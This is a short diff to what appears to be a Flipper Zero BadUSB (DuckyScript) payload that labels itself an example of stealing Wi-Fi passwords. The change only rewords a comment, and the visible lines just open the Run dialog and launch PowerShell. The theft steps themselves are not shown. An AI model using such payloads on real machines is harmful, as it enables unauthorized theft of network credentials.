@@ -1,6 +1,6 @@
 REM This is an example of stealing wifi password using flipper zero
 
-REM Open windows CMD
+REM Open windows powershell
 GUI r
 DELAY 500
 STRING powershell.exe
